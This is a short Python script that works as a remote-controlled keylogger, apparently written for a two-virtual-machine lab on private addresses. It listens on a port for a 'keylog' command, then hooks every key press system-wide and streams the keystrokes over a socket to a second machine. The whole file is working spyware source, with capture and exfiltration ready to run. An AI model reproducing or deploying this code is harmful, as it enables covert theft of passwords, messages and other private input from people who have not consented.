# File: vm2_keylog_sender.py

import socket
import keyboard
import threading
import time

def keylogger(send_socket):
    counter = 1
    last_activity_time = time.time()

    def on_key_press(event):
        nonlocal counter, last_activity_time
        current_time = time.time()

        if current_time - last_activity_time >= 1.5:
            counter = 1
        else:
            counter += 1

        data_to_send = f'{event.name}{counter}'
        send_socket.sendall(data_to_send.encode())
        last_activity_time = current_time

    keyboard.on_press(on_key_press)
    while True:
        time.sleep(0.1)

def listen_for_command():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((VM2_IP, VM2_PORT))
        s.listen()
        conn, addr = s.accept()
        with conn:
            while True:
                data = conn.recv(1024)
                if data.decode() == 'keylog':
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as send_socket:
                        send_socket.connect((VM1_IP, VM1_RECEIVE_PORT))
                        keylogger(send_socket)

# VM2's network configuration
VM2_IP = '192.168.64.7'  # VM2's IP Address
VM2_PORT = 55555        # Port for listening to VM1's commands

# VM1's network configuration for sending data back
VM1_IP = '192.168.64.5'  # VM1's IP Address
VM1_RECEIVE_PORT = 55554 # VM1's port for receiving data

listen_for_command()
